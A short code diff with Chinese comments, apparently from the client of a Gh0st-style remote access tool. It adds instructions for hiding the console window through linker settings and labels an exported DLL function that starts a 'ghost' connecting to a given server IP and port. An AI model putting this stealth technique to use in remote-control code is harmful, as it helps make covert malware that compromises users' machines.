@@ -20,6 +20,12 @@ DWORD WINAPI StartClient(LPVOID lParam);
 
 enum { E_RUN, E_STOP } status;
 
+// 隐藏控制台
+// 参看：https://blog.csdn.net/lijia11080117/article/details/44916647
+// step1: 在链接器"高级"设置入口点为mainCRTStartup
+// step2: 在链接器"系统"设置系统为窗口
+// 完成
+
 BOOL CALLBACK callback(DWORD CtrlType)
 {
 	if (CtrlType == CTRL_CLOSE_EVENT)
@@ -85,7 +91,7 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 	return TRUE;
 }
 
-
+// 启动运行一个ghost
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
 	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
